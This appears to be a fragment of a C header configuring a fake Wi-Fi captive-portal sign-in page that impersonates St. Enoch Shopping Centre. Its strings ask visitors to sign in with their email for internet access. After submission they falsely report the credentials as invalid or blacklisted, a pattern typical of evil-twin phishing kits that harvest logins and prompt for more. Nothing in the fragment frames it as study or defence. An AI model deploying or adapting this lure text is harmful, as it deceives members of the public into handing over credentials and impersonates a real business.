...
#define SUBTITLE "St. Enoch Shopping Centre."
#define TITLE "Sign in:"
#define BODY "Sign in with your email to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Oops! Your credentials are invalid or blacklisted. Please try again or use a different device. </br>Thank you."
